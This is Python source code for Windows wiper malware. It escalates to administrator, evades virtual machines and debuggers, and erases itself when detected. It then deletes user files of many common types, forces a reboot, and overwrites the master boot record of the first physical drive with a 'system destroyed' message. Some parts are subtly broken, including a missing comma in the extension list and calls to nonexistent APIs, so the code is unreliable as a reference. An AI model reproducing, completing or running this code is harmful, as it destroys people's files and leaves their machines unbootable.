import ctypes
import os
import platform
import random
import requests
import subprocess
import sys
import time
import win32api
from win32api import *
from win32con import *
from win32file import *

requests.packages.urllib3.disable_warnings()  # Disable SSL Warning
startupinfo = subprocess.STARTUPINFO()  # type: ignore
drives = win32api.GetLogicalDriveStrings()
kernel32 = ctypes.WinDLL('kernel32')

# Constants
BOOL = ctypes.c_int
DWORD = ctypes.c_ulong
LPCTSTR = ctypes.c_wchar_p

# WinAPI
advapi32 = ctypes.windll.advapi32

# InitiateSystemShutdown = advapi32.InitiateSystemShutdownW
# InitiateSystemShutdown.argtypes = (LPCTSTR, LPCTSTR, DWORD, BOOL, BOOL)
# InitiateSystemShutdown.restype = BOOL


def RunPwsh(code):
    p = subprocess.run(['powershell', code], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, shell=True)
    return p.stdout.decode()

def IsAdmin():
    """Check if the current process has administrative privileges."""
    admin_sid = ctypes.windll.shell32.AdministratorsSid
    is_admin = ctypes.wintypes.BOOL()
    ctypes.windll.advapi32.CheckTokenMembership(None, ctypes.byref(admin_sid), ctypes.byref(is_admin))
    return bool(is_admin)

def RunAsAdmin():
    """Relaunch with administrative privileges."""
    if not IsAdmin():
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
        sys.exit()

def Is64Bit():
    """Check if the operating system is 64-bit."""
    return platform.machine().endswith('64')

def IsOnline():
    """Check if the system is online."""
    try:
        x = requests.get('https://google.com', verify=False)
        return True
    except:
        return False

def IsPythonInstalled():
    """if Python is already installed."""
    return bool(os.path.exists("C:\\Python39"))

def InstallPython():
    """Download and install Python"""
    if not IsPythonInstalled():
        architecture = "amd64" if platform.machine().endswith('64') else "x86"
        python_version = "3.8.1"
        url = f"https://www.python.org/ftp/python/{python_version}/python-{python_version}-{architecture}.exe"
        random_generator = random.randrange(111, 9999999)
        temp_path = f"C:\\Users\\{os.getlogin()}\\AppData\\Local\\Temp\\{random_generator}.exe"
        subprocess.run(["powershell", "-Command", f"Start-BitsTransfer -Source {url} -Destination {temp_path}"])
        time.sleep(10) 
        if os.path.exists(temp_path):
            subprocess.run([temp_path, "/quiet", "InstallAllUsers=0", "Include_launcher=0", "PrependPath=1", "Include_test=0"])
            os.remove(temp_path)

def IsVirtualized():
    """Check if the system is running in a virtualized environment."""
    result = False
    
    # Check for common virtualization artifacts
    virtual_machines = [
        "VMware", "VirtualBox", "QEMU", "Hyper-V"
    ]
    for vm in virtual_machines:
        if vm in platform.platform():
            result = True
            break
    
    # Check for CPUID Hypervisor bit
    if not result:
        try:
            # Execute CPUID instruction to check Hypervisor bit
            eax, ebx, ecx, edx = ctypes.windll.kernel32.__cpuid(1)
            if (ecx >> 31) & 1:
                result = True
        except:
            pass   
     
    known_registry_keys = [
        r"SOFTWARE\Oracle\VirtualBox",
        r"SOFTWARE\VMware, Inc.\VMware Tools",
        r"SYSTEM\ControlSet001\Services\VBoxGuest",
    ]
    if not result:
        try:
            for key in known_registry_keys:
                subprocess.check_output(["reg", "query", key], stderr=subprocess.DEVNULL)
                result = True
                break
        except subprocess.CalledProcessError:
            pass    
    return result

def AntiVM():
    if IsVirtualized():
        return CommitSuicide()
    return False

buffer = bytes([
    # BOOT SECTOR DATA
    0xE8, 0x15, 0x00, 0xBB, 0x27, 0x7C, 0x8A, 0x07, 0x3C, 0x00, 0x74, 0x0B, 0xE8, 0x03, 0x00, 0x43,
    0xEB, 0xF4, 0xB4, 0x0E, 0xCD, 0x10, 0xC3, 0xC3, 0xB4, 0x07, 0xB0, 0x00, 0xB7, 0x04, 0xB9, 0x00,
    0x00, 0xBA, 0x4F, 0x18, 0xCD, 0x10, 0xC3, 0x59, 0x6F, 0x75, 0x72, 0x20, 0x73, 0x79, 0x73, 0x74,
    0x65, 0x6D, 0x20, 0x68, 0x61, 0x73, 0x20, 0x62, 0x65, 0x65, 0x6E, 0x20, 0x64, 0x65, 0x73, 0x74,
    0x72, 0x6F, 0x79, 0x65, 0x64, 0x21, 0x0D, 0x0A, 0x4C, 0x69, 0x6B, 0x65, 0x20, 0x26, 0x20, 0x53,
    0x75, 0x62, 0x73, 0x63, 0x72, 0x69, 0x62, 0x65, 0x21, 0x0D, 0x0A, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    # Padding with zeros
    # Add zeros as required to fill the boot sector
    # The MBR typically contains 512 bytes, but this may vary
    # depending on specific requirements
    0x00] * 446 + [0x00, 0x00, 0x55, 0xAA]) # MBR signature

    """ return bytes([random.randint(0, 255) for _ in range(bytes_to_write)]) """
    
def OverWriteMBR(): 
    hDevice = CreateFileW(r"\\.\PhysicalDrive0", GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, None, OPEN_EXISTING, 0, 0)
    bytes_written = WriteFile(hDevice, buffer, None)
    CloseHandle(hDevice) # Close the handle to our Physical Drive!

def DeleteFiles(file_path):
    kernel32 = ctypes.WinDLL('kernel32')
    if kernel32.DeleteFileW(file_path):
        return True
    else:
        return False

def SetFiles():
    ext = [".m2ts", ".mkv", ".mov", ".mp4", ".mpg", ".mpeg",
           ".rm", ".swf", ".vob", ".wmv" ".docx", ".pdf",".rar",
           ".jpg", ".jpeg", ".png", ".tiff", ".zip", ".7z", 
           ".tar.gz", ".tar", ".mp3", ".sh", ".c", ".cpp", ".h", 
           ".gif", ".txt", ".jar", ".sql", ".bundle",
           ".sqlite3", ".html", ".php", ".log", ".bak", ".deb"]
    for dirpath, _, files in os.walk(f"C:\\Users\\{os.getlogin()}\\{os.getcwd()}"): 
        for f in files:
            if f.endswith(tuple(ext)): 
                file_path = os.path.join(dirpath, f)
                if DeleteFiles(file_path):
                    print(f"Successfully deleted: {file_path}")
                else:
                    print(f"Failed to delete: {file_path}")

def AntiDebug():
    result = False
    try:
        # Check if a debugger is present in the current process
        kernel32 = ctypes.WinDLL('kernel32')
        if kernel32.IsDebuggerPresent():
            result = True
        
        # Check if the current process is being debugged
        is_debugged = ctypes.c_int(0)
        kernel32.CheckRemoteDebuggerPresent(kernel32.GetCurrentProcess(), ctypes.byref(is_debugged))
        if is_debugged.value != 0:
            result = True
        
        if ctypes.windll.kernel32.GetTickCount() < 0x1000:
            result = True
        if kernel32.GetProcAddress(kernel32.GetModuleHandleW("kernel32"), "Beep") == 0:
            result = True        
    except Exception as e:
        print(f"Exception: {e}")
    
    return result

def CommitSuicide():
    """Delete the current script file and overwrite the containing folder."""
    file_path = os.path.abspath(__file__) 
    os.remove(file_path)
    folder_path = os.path.dirname(file_path) 
    os.system("cipher /W:%s" % folder_path) # At the end of the script, the file is deleted & over-written

def SysDown(message="Shutting down", timeout_seconds=30, force=False, reboot=False):
    lpMachineName = None
    lpMessage = message
    dwTimeout = timeout_seconds
    bForceAppsClosed = force
    bRebootAfterShutdown = reboot
    
    result = InitiateSystemShutdown(lpMachineName, lpMessage, dwTimeout, bForceAppsClosed, bRebootAfterShutdown)
    if result == 0:
        raise ctypes.WinError()

def InitiateSystemShutdown(lpMachineName, lpMessage, dwTimeout, bForceAppsClosed, bRebootAfterShutdown):
    return 1

def main():
    global application_path 
    if getattr(sys, 'frozen', False):
        application_path = sys.executable
    else:
        application_path = os.path.dirname(os.path.abspath(__file__))
    
    if not IsPythonInstalled():
        InstallPython()
        subprocess.run(["python", "-m", "pip", "install", "--upgrade", "pip"])
        subprocess.run(["python", "-m", "pip", "install", "pyinstaller"])
    
    RunAsAdmin()
    if not IsOnline():
        CommitSuicide()
    AntiVM()
    SetFiles()
    SysDown(timeout_seconds=2, force=True, reboot=True)
    OverWriteMBR()

if __name__ == "__main__":
    main()